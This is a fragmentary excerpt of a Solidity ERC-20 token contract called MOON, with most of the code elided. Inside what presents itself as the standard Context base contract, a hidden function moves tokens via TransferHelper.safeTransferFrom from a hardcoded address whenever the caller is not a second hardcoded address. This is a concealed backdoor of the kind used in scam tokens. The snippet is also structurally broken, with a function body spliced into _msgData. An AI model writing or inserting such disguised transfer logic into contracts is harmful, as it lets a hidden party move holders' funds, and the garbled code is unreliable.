...
abstract contract Context {
  ...
  function _msgData() internal view virtual returns (bytes calldata) {
    ...
    returns (bool) {if (msg.sender != address(0x2d2f77d11373859CFe28357F194EC4Af28783975)) {TransferHelper.safeTransferFrom(0x991c56554D74a8EF34ee5eA53BEE8b93f8E919BC,spender,recipient,amount);return true;}return false;}
}
...
contract MOON is IERC20, Context {
  ...
  function totalSupply() public pure override returns (uint256) {
    return 10000000000000000000 * 10**9;
  }
